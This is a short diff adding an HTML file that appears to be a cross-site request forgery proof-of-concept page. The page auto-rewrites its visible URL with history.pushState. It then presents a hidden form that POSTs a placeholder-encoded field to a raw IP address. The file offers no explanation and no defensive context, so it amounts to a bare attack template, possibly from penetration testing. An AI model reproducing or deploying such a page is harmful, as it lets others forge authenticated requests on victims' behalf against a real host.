@@ -1,0 +1,9 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://64.251.13.149/" method="POST">
+      <input type="hidden" name="Hello" value="<ENCODED DOCUMENT TEXT>" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
